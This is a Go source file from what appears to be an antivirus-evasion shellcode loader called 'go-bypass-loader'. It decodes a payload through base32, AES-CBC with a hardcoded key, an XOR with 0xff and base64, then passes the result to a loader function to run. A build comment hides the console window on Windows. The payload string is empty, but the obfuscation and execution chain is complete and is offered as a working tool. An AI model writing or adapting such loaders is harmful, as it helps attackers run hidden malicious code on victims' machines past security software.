package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base32"
	"encoding/base64"
	"fmt"
	"go-bypass-loader/loader"
)

// 去掉字符（末尾）
func UnPaddingText1(str []byte) []byte {
	n := len(str)
	count := int(str[n-1])
	newPaddingText := str[:n-count]
	return newPaddingText
}

// ---------------DES解密--------------------
func DecrptogAES(src, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(nil)
		return nil
	}
	blockMode := cipher.NewCBCDecrypter(block, key)
	blockMode.CryptBlocks(src, src)
	src = UnPaddingText1(src)
	return src
}

func main() {

	message := ""

	aesMsg, _ := base32.HexEncoding.DecodeString(message)
	key := []byte("AofqwwWicshoiqQq")
	xordMessage := string(DecrptogAES(aesMsg, key))

	originalMessage := make([]byte, len(xordMessage))
	for i := 0; i < len(xordMessage); i++ {
		originalMessage[i] = xordMessage[i] ^ 0xff
	}

	sc, _ := base64.StdEncoding.DecodeString(string(originalMessage))
	loader.Y(sc)

	//go build -ldflags="-H windowsgui" .\main.go
}
